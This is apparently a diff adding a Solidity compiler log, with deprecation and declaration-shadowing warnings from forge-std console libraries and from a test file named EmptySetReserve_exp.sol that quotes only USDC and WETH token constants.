@@ -1,0 +1,1963 @@
+Compiling 23 files with Solc 0.8.34
+Solc 0.8.34 finished in 555.90ms
+Compiler run successful with warnings:
+Warning (8429): Virtual modifiers are deprecated and scheduled for removal.
+  --> basetest.sol:87:5:
+   |
+87 |     modifier balanceLog() virtual {
+   |     ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (8429): Virtual modifiers are deprecated and scheduled for removal.
+   --> basetest.sol:103:5:
+    |
+103 |     modifier balanceLog2(address target) virtual {
+    |     ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:1084:5:
+     |
+1084 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:1896:5:
+     |
+1896 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:2198:5:
+     |
+2198 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:2967:5:
+     |
+2967 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:4462:5:
+     |
+4462 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+  --> test/EmptySetReserve_exp.sol:51:5:
+   |
+51 |     IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+    --> interface.sol:3064:1:
+     |
+3064 | interface USDC {
+     | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+   --> test/EmptySetReserve_exp.sol:108:5:
+    |
+108 |     IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+    --> interface.sol:3064:1:
+     |
+3064 | interface USDC {
+     | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+   --> test/EmptySetReserve_exp.sol:112:5:
+    |
+112 |     IWETH private constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
+    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+  --> lib/forge-std/src/console.sol:11:9:
+   |
+11 |         assembly {
+   |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+  --> lib/forge-std/src/safeconsole.sol:15:9:
+   |
+15 |         assembly {
+   |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+  --> lib/forge-std/src/safeconsole.sol:23:9:
+   |
+23 |         assembly {
+   |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+  --> lib/forge-std/src/safeconsole.sol:32:9:
+   |
+32 |         assembly {
+   |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+  --> lib/forge-std/src/safeconsole.sol:40:9:
+   |
+40 |         assembly {
+   |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+  --> lib/forge-std/src/safeconsole.sol:52:13:
+   |
+52 |             assembly {
+   |             ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+  --> lib/forge-std/src/safeconsole.sol:63:13:
+   |
+63 |             assembly {
+   |             ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+  --> lib/forge-std/src/safeconsole.sol:75:13:
+   |
+75 |             assembly {
+   |             ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+  --> lib/forge-std/src/safeconsole.sol:82:13:
+   |
+82 |             assembly {
+   |             ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+  --> lib/forge-std/src/safeconsole.sol:91:13:
+   |
+91 |             assembly {
+   |             ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:103:9:
+    |
+103 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:112:9:
+    |
+112 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:122:9:
+    |
+122 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:131:9:
+    |
+131 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:141:9:
+    |
+141 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:150:9:
+    |
+150 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:162:9:
+    |
+162 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:181:9:
+    |
+181 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:194:9:
+    |
+194 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:205:9:
+    |
+205 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:217:9:
+    |
+217 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:228:9:
+    |
+228 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:240:9:
+    |
+240 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:251:9:
+    |
+251 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:265:9:
+    |
+265 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:286:9:
+    |
+286 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:300:9:
+    |
+300 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:311:9:
+    |
+311 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:323:9:
+    |
+323 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:334:9:
+    |
+334 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:346:9:
+    |
+346 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:357:9:
+    |
+357 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:371:9:
+    |
+371 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:392:9:
+    |
+392 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:406:9:
+    |
+406 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:417:9:
+    |
+417 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:429:9:
+    |
+429 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:440:9:
+    |
+440 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:452:9:
+    |
+452 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:463:9:
+    |
+463 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:477:9:
+    |
+477 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:498:9:
+    |
+498 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:514:9:
+    |
+514 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:535:9:
+    |
+535 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:551:9:
+    |
+551 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:572:9:
+    |
+572 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:588:9:
+    |
+588 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:609:9:
+    |
+609 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:627:9:
+    |
+627 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:651:9:
+    |
+651 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:668:9:
+    |
+668 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:681:9:
+    |
+681 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:695:9:
+    |
+695 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:708:9:
+    |
+708 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:722:9:
+    |
+722 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:735:9:
+    |
+735 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:751:9:
+    |
+751 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:774:9:
+    |
+774 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:790:9:
+    |
+790 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:803:9:
+    |
+803 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:817:9:
+    |
+817 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:830:9:
+    |
+830 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:844:9:
+    |
+844 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:857:9:
+    |
+857 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:873:9:
+    |
+873 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:896:9:
+    |
+896 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:912:9:
+    |
+912 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:925:9:
+    |
+925 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:939:9:
+    |
+939 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:952:9:
+    |
+952 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:966:9:
+    |
+966 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:979:9:
+    |
+979 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:995:9:
+    |
+995 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1018:9:
+     |
+1018 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1036:9:
+     |
+1036 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1059:9:
+     |
+1059 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1077:9:
+     |
+1077 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1100:9:
+     |
+1100 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1118:9:
+     |
+1118 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1141:9:
+     |
+1141 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1161:9:
+     |
+1161 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1187:9:
+     |
+1187 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1205:9:
+     |
+1205 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1218:9:
+     |
+1218 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1232:9:
+     |
+1232 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1245:9:
+     |
+1245 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1259:9:
+     |
+1259 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1272:9:
+     |
+1272 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1288:9:
+     |
+1288 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1311:9:
+     |
+1311 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1327:9:
+     |
+1327 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1340:9:
+     |
+1340 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1354:9:
+     |
+1354 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1367:9:
+     |
+1367 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1381:9:
+     |
+1381 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1394:9:
+     |
+1394 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1410:9:
+     |
+1410 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1433:9:
